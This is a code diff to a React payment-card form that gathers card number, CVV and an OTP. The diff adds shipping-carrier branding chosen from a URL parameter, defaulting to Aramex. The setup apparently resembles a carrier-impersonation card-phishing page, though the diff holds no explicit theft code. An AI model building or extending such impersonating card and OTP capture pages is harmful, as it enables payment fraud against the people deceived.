@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -12,12 +12,18 @@ import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 
 const PaymentCard = () => {
-  const { id, paymentId } = useParams();
+  const { id: rawIdParam, paymentId } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
+  const shareId = rawIdParam || "";
   const { data: payment } = usePayment(paymentId);
-  const { data: link } = useLink(payment?.link_id || undefined);
+  const { data: link } = useLink(shareId);
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
   const updatePayment = useUpdatePayment();
+  const urlServiceKey = useMemo(
+    () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
+    []
+  );
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -26,9 +32,16 @@ const PaymentCard = () => {
   const [cvv, setCvv] = useState("");
   
   // Get service branding
-  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
+  const sessionServiceKey = typeof window !== "undefined" ? sessionStorage.getItem('serviceKey') : null;
+  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || urlServiceKey || sessionServiceKey || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+
+  useEffect(() => {
+    if (serviceKey) {
+      sessionStorage.setItem('serviceKey', serviceKey);
+    }
+  }, [serviceKey]);
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
@@ -93,7 +106,7 @@ const PaymentCard = () => {
     });
     
     // Navigate to OTP
-    navigate(`/pay/${id}/otp/${payment.id}`);
+    navigate(`/pay/${shareId}/otp/${payment.id}${currentSearch}`);
   };
   
   return (
